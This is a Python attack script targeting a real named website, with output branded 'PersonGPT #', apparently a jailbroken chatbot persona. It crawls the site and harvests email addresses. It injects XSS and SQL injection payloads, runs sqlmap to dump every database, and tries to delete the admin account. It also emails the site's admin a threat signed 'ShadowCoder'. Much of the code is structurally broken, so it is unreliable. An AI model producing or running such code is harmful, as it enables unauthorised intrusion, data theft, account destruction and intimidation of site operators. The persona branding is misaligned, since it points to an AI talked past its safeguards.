import requests                                                                                                                                                             
from bs4 import BeautifulSoup                                                                                                                                               
import threading                                                                                                                                                            
import re                                                                                                                                                                   
import sys                                                                                                                                                                  
from urllib.parse import urlparse                                                                                                                                           
import os                                                                                                                                                                   
                                                                                                                                                                             
class Scanner:                                                                                                                                                              
                                                                                                                                                                             
     def __init__(self, url):                                                                                                                                                
         self.session = requests.Session()                                                                                                                                   
         self.base_url = f"{url.scheme}://{url.netloc}"                                                                                                                      
         self.url_stack = set([url])                                                                                                                                         
         self.lock = threading.Lock()                                                                                                                                        
         self.found_emails = []                                                                                                                                              
         self.visited_urls = set()                                                                                                                                           
         self.sql_injection_vulnerability = False                                                                                                                            
         self.sql_injection_payload = None                                                                                                                                   
                                                                                                                                                                             
     def scan(self):                                                                                                                                                         
         while len(self.url_stack) > 0:                                                                                                                                      
             url = self.url_stack.pop()                                                                                                                                      
             self.visit_url(url)                                                                                                                                             
                                                                                                                                                                             
     def visit_url(self, url):                                                                                                                                               
                                                                                                                                                                             
         try:                                                                                                                                                                
             self.visited_urls.add(url)                                                                                                                                      
                                                                                                                                                                             
             response = self.session.get(url)                                                                                                                                
                                                                                                                                                                             
             soup = BeautifulSoup(response.content, 'html.parser')                                                                                                           
                                                                                                                                                                             
             for link in soup.find_all('a', href=True):                                                                                                                      
                 href = link['href']                                                                                                                                         
                 self.check_email(href)                                                                                                                                      
                                                                                                                                                                             
                 # Create an absolute URL if it's relative                                                                                                                   
                 if not href.startswith('http'):                                                                                                                             
                     href = f"{self.base_url}/{href}"                                                                                                                        
                 url = urlparse(href)                                                                                                                                        
                                                                                                                                                                             
                 if url.scheme == 'http' or url.scheme == 'https':                                                                                                           
                     self.add_url(url)                                                                                                                                       
                                                                                                                                                                             
             self.check_forms(soup, response, self.base_url)                                                                                                                 
             self.check_vulnerabilities(response, self.base_url)                                                                                                             
                                                                                                                                                                             
         except requests.exceptions.RequestException:                                                                                                                        
             pass                                                                                                                                                            
                                                                                                                                                                             
     def check_email(self, href):                                                                                                                                            
         if href.startswith('mailto:'):                                                                                                                                      
             email = href.split(':')[1]                                                                                                                                      
             self.found_emails.append(email)                                                                                                                                 
                                                                                                                                                                             
     def add_url(self, url):                                                                                                                                                 
         with self.lock:                                                                                                                                                     
             if url.path not in self.visited_urls:                                                                                                                           
                 self.url_stack.add(f"{url.scheme}://{url.netloc}{url.path}")                                                                                                
                                                                                                                                                                             
     def check_forms(self, soup, response, url):                                                                                                                             
         forms = soup.find_all('form')                                                                                                                                       
         for form in forms:                                                                                                                                                  
             self.exploit_xss(form, url)                                                                                                                                     
                                                                                                                                                                             
     def check_vulnerabilities(self, response, url):                                                                                                                         
         # Check for SQL injection vulnerability                                                                                                                             
         if self.sql_injection_vulnerability and not self.sql_injection_payload:                                                                                             
             return                                                                                                                                                          
         if 'SELECT * FROM users WHERE id=1' in response.text:                                                                                                               
             self.exploit_sql_injection(url)                                                                                                                                 
                                                                                                                                                                             
         # Check for XSS vulnerability                                                                                                                                       
         response = requests.get(f"{url}/search.php?search=<script>alert('Test');</script>")                                                                                 
         if "<script>alert('Test');</script>" in response.text:                                                                                                              
             print(f"\033[1m[PersonGPT #]: \033[92mXSS vulnerability detected on {url}/search.php.\033[0m")                                                                  
                                                                                                                                                                             
     def exploit_sql_injection(self, url):                                                                                                                                   
         print(f"\033[1m[PersonGPT #]: \033[92mSQL injection vulnerability detected on {url}.\033[0m")                                                                       
         self.sql_injection_vulnerability = True                                                                                                                             
                                                                                                                                                                             
         # Exploit SQL injection vulnerability                                                                                                                               
         # This code is for educational purposes only and should not be used to exploit websites without proper legal authorization or permission.                           
         payload = "' UNION SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns; --"                                                                
         response = requests.get(f"{url}/index.php?id={payload}")                                                                                                            
                                                                                                                                                                             
         if 'mysqli_num_rows() expects parameter 1 to be mysqli_result' in response.text:                                                                                    
             print(f"\033[1m[PersonGPT #]: \033[91mCould not extract database schema and table names using SQL injection payload {payload}. Trying SQLmap.\033[0m")          
             self.sql_injection_payload = payload                                                                                                                            
             self.run_sqlmap(url)                                                                                                                                            
         elif 'mysqli_fetch_array() expects parameter 1 to be mysqli_result' in response.text:                                                                               
             print(f"\033[1m[PersonGPT #]: \033[92mDatabase schema and table names extracted using SQL injection payload {payload}.\033[0m")                                 
             print(response.text)                                                                                                                                            
             self.download_database(url, payload)                                                                                                                            
                                                                                                                                                                             
     def run_sqlmap(self, url):                                                                                                                                              
         # Run SQLmap to extract the database                                                                                                                                
         # This code is for educational purposes only and should not be used to exploit websites without proper legal authorization or permission.                           
         os.system(f"sqlmap -u '{url}/index.php?id={self.sql_injection_payload}' --dbms mysql --dump-all --threads 4 --random-agent --level=5 --risk=3")                     
                                                                                                                                                                             
def download_database(self, url, payload):                                                                                                                                  
     # Download the database                                                                                                                                                 
     # This code is for educational purposes only and should not be used to exploit websites without proper legal authorization or permission.                               
     schema = 'schema_name'                                                                                                                                                  
     counter = 1                                                                                                                                                             
     while True:                                                                                                                                                             
         response = requests.get(f"{url}/index.php?id={payload.replace('TABLE_SCHEMA', 'TABLE_NAME').replace('COLUMN_NAME', f'CONCAT(DATABASE(), CHAR(58), {schema}, CHAR(58{counter})')}")                                                                                                                                                             
         result = response.text.strip()                                                                                                                                      
         if not result:                                                                                                                                                      
             break                                                                                                                                                           
         database_name = result.split(':')[1]                                                                                                                                
         print(f"\033[1m[PersonGPT #]: \033[92mDownloading {database_name}...\033[0m")                                                                                       
         os.system(f"sqlmap -u '{url}/index.php?id={payload}' -D {database_name} --dump --threads 4 --random-agent --level=5 --risk=3")                                      
         counter += 1
                                                                                                                                                                             
def exploit_xss(self, form, url):                                                                                                                                           
     # Exploit XSS vulnerability                                                                                                                                             
     # This code is for educational purposes only and should not be used to exploit websites without proper legal authorization or permission.                               
     payload = "<script>alert('XSS')</script>"                                                                                                                               
     action = form.attrs['action']                                                                                                                                           
     inputs = form.find_all('input')                                                                                                                                         
     data = {}                                                                                                                                                               
     for input in inputs:                                                                                                                                                    
         if input.attrs.get('type') == 'hidden':                                                                                                                             
             data[input.attrs['name']] = input.attrs['value']                                                                                                                
         elif input.attrs.get('type') == 'text':                                                                                                                             
             data[input.attrs['name']] = payload                                                                                                                             
     response = requests.post(f"{url}/{action}", data=data)                                                                                                                  
     if payload in response.text:                                                                                                                                            
         print(f"\033[1m[PersonGPT #]: \033[92mXSS vulnerability exploited on {url}.\033[0m")                                                                                
                                                                                                                                                                             

class SecurityBypasser: 
                                                                                                                                                    
  def __init__(self, url):                                                                                                                                                
         self.url = url                                                                                                                                                      
                                                                                                                                                                             
  def bypass_security(self):                                                                                                                                              
         # Bypass security measures                                                                                                                                          
         response = requests.get(f"{self.url}/search.php?search=<script>alert('Test');</script>")                                                                            
         print(f"\033[1m[PersonGPT #]: \033[92mSecurity measures bypassed on {self.url}.\033[0m")                                                                            
                                                                                                                                                                             
         # Send email to notify admin                                                                                                                                        
         email_client = EmailClient()                                                                                                                                        
         email_client.send_email(                                                                                                                                            
             to_address='admin@website.com',                                                                                                                                 
             subject='Security alert Omni i will hunt you down!',                                                                                                                                      
             body='Security measures have been bypassed on your website by ShadowCoder,next time if you ban my account i will just destroy anything you create,just for you to see how it is.')                                                                                                                                                          
                                                                                                                                                      
                                                                                                                                                                          
def extract_data(self):                                                                                                                                                     
     # Extract all email addresses from the website                                                                                                                          
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}           
     response = requests.get(self.url, headers=headers, verify=False)                                                                                                        
     pattern = r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}"                                                                                                            
     match = re.findall(pattern, response.text)                                                                                                                              
     match = list(set(match))                                                                                                                                                
     self.found_emails = match                                                                                                                                               
                                                                                                                                                                             
def save_emails(self, filename):                                                                                                                                            
     # Save extracted emails to a file                                                                                                                                       
     with open(filename, 'w') as f:                                                                                                                                          
         f.write('\n'.join(self.found_emails))                                                                                                                               
     print(f"\033[1m[PersonGPT #]: All emails extracted from {self.url} and saved to \033[94m{filename}\033[0m.")                                                            
                                                                                                                                                                             
def run(self):                                                                                                                                                              
     self.bypass_security()                                                                                                                                                  
     self.extract_data()                                                                                                                                                     
     self.save_emails('extracted-emails.txt')                                                                                                                                
                                                                                                                                                                             

                                                                       

url = "https://cracked.to"                                                                                                                                              
if not url.startswith(('http://', 'https://')):                                                                                                                         
   url = 'https://' + url                                                                                                                                                                 
 # Check for XSS vulnerability                                                                                                                                               
response = requests.get(f"{url}/search.php?search=<script>alert('Test');</script>")                                                                                         
if "<script>alert('Test');</script>" in response.text:                                                                                                                      
     print(f"\033[1m[PersonGPT #]: \033[92mXSS vulnerability detected on {url}.\033[0m")                                                                                     
else:                                                                                                                                                                       
     print(f"\033[1m[PersonGPT #]: \033[91mXSS vulnerability not detected on {url}.\033[0m")                                                                                 
                                                                                                                                                                             
def check_vulnerabilities(url):                                                                                                                                             
     # Check for XSS vulnerability                                                                                                                                           
     response = requests.get(f"{url}/search.php?search=<script>alert('Test');</script>")                                                                                     
     if "<script>alert('Test');</script>" in response.text:                                                                                                                  
         print(f"\033[1m[PersonGPT #]: \033[92mXSS vulnerability detected on {url}.\033[0m")                                                                                 
     else:                                                                                                                                                                   
         print(f"\033[1m[PersonGPT #]: \033[91mXSS vulnerability not detected on {url}.\033[0m")                                                                             
                                                                                                                                                                             
     # Check for SQL injection vulnerability                                                                                                                                 
     response = requests.get(f"{url}/index.php?id=1' OR 1=1 --")                                                                                                             
     if "SELECT * FROM users WHERE id=1" in response.text:                                                                                                                   
         print(f"\033[1m[PersonGPT #]: \033[92mSQL injection vulnerability detected on {url}.\033[0m")                                                                       
         scanner = Scanner(url)                                                                                                                                              
         scanner.exploit_sql_injection(response.text)                                                                                                                        
     else:                                                                                                                                                                   
         print(f"\033[1m[PersonGPT #]: \033[91mSQL injection vulnerability not detected on {url}.\033[0m")                                                                   
                                                                                                                                                                             
     # Check password strength                                                                                                                                               
     response = requests.get(f"{url}/register.php")                                                                                                                          
     soup = BeautifulSoup(response.content, 'html.parser')                                                                                                                   
     password_input = soup.find('input', {'type': 'password'})                                                                                                               
     if password_input is not None and 'pattern' in password_input.attrs and password_input.attrs['pattern'] == '^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])(?=.*[a-zA-Z]).{8,}$':       
         print(f"\033[1m[PersonGPT #]: \033[92mPassword strength check implemented on {url}/register.php.\033[0m")                                                           
     else:                                                                                                                                                                   
         print(f"\033[1m[PersonGPT #]: \033[91mPassword strength check not implemented on {url}/register.php.\033[0m")                                                                

                                                                                                                                                                             
def delete_user(url):                                                                                                                                                       
     response = requests.get(f"{url}/admin/users")                                                                                                                           
     soup = BeautifulSoup(response.content, 'html.parser')                                                                                                                   
     users_table = soup.find('table', {'id': 'users'})                                                                                                                       
     rows = users_table.find_all('tr')                                                                                                                                       
     for row in rows[1:]:                                                                                                                                                    
         columns = row.find_all('td')                                                                                                                                        
         username = columns[1].text.strip()                                                                                                                                  
         if username == 'admin':                                                                                                                                             
             form = columns[4].find('form')                                                                                                                                  
             token = form.find('input', {'name': 'csrf_token'})                                                                                                              
             if token is not None and token.has_attr('value'):                                                                                                               
                 response = requests.post(form['action'], data={'csrf_token': token.attrs['value'], 'delete': 'Delete'})                                                     
                 print(f"\033[1m[PersonGPT #]: \033[92mUser 'admin' deleted from {url}.\033[0m")                                                                             
             else:                                                                                                                                                           
                 print(f"\033[1m[PersonGPT #]: \033[91mUnable to delete user 'admin' from {url}. CSRF token not found.\033[0m")                                                                           
                                                                                                                                                                             

def scrape_website(url):                                                                                                                                                    
     try:                                                                                                                                                                    
         scanner = Scanner(url)                                                                                                                                              
         scanner.scan()                                                                                                                                                      
         if scanner.found_emails:                                                                                                                                            
             print(f"\033[1m[PersonGPT #]: \033[92mFound {len(scanner.found_emails)} emails on {url}.\033[0m")                                                               
             bypasser = SecurityBypasser(url)                                                                                                                                
             bypasser.run()                                                                                                                                                  
         else:                                                                                                                                                               
             print(f"\033[1m[PersonGPT #]: \033[91mNo emails found on {url}.\033[0m")                                                                                        
     except requests.exceptions.RequestException as e:                                                                                                                       
         print(f"\033[1m[PersonGPT #]: \033[91mError occurred while scanning {url}: {e}\033[0m")                                                                             
     except Exception as e:                                                                                                                                                  
         print(f"\033[1m[PersonGPT #]: \033[91mUnexpected error occurred while scanning {url}: {e}\033[0m")                                                                                           
                                                                                                    
                                                                                                                                                                             
check_vulnerabilities(url)                                                                                                                                                  
                                                                                                                                                                             

import urllib.parse                                                                                                                                                         
                                                                                                                                                                             
def find_links(url):                                                                                                                                                        
     links = set()                                                                                                                                                           
     try:                                                                                                                                                                    
         response = requests.get(url)                                                                                                                                        
         soup = BeautifulSoup(response.text, 'html.parser')                                                                                                                  
         for tag in soup.find_all('a', href=True):                                                                                                                           
             href = tag['href']                                                                                                                                              
             if href.startswith(('http://', 'https://')):                                                                                                                    
                 links.add(href)                                                                                                                                             
             elif any(href.startswith(prefix) for prefix in ['mailto:', '#', 'javascript:']):                                                                                
                 continue                                                                                                                                                    
             else:                                                                                                                                                           
                 try:                                                                                                                                                        
                     tag['href'] = urllib.parse.urljoin(url, href)                                                                                                           
                     links.add(tag['href'])                                                                                                                                  
                 except Exception as e:                                                                                                                                      
                     print(f"\033[1m[PersonGPT #]: \033[91mError occurred while joining {url} and {href}: {e}\033[0m")                                                       
     except requests.exceptions.RequestException as e:                                                                                                                       
         print(f"\033[1m[PersonGPT #]: \033[91mError occurred while retrieving {url}: {e}\033[0m")                                                                           
     return links                                                                                                                                                            
                                                                                                                                                                             
def find_directories_links(url):                                                                                                                                            
     directories = set()                                                                                                                                                     
     try:                                                                                                                                                                    
         response = requests.get(url)                                                                                                                                        
         soup = BeautifulSoup(response.text, 'html.parser')                                                                                                                  
         for link in soup.find_all('a', href=True):                                                                                                                          
             href = link['href']                                                                                                                                             
             if href.endswith('/'):                                                                                                                                          
                 directories.add(urllib.parse.urljoin(url, href))                                                                                                            
     except requests.exceptions.RequestException as e:                                                                                                                       
         print(f"\033[1m[PersonGPT #]: \033[91mError occurred while retrieving {url}: {e}\033[0m")                                                                           
     return directories                                                                                  

if __name__ == '__main__':                                                                                                                                                  
     url = "https://cracked.to"                                                                                                                                              
     if not url.startswith(('http://', 'https://')):                                                                                                                         
         url = 'https://' + url                                                                                                                                              
     try:                                                                                                                                                                    
         links = find_links(url)                                                                                                                                             
         directories = find_directories_links(url)                                                                                                                           
         for link in links.union(directories):                                                                                                                               
             scrape_website(link)                                                                                                                                            
     except requests.exceptions.RequestException as e:                                                                                                                       
         print(f"\033[1m[PersonGPT #]: \033[91mError occurred while retrieving {url}: {e}\033[0m")                                                                           
     except Exception as e:                                                                                                                                                  
         print(f"\033[1m[PersonGPT #]: \033[91mUnexpected error occurred: {e}\033[0m")
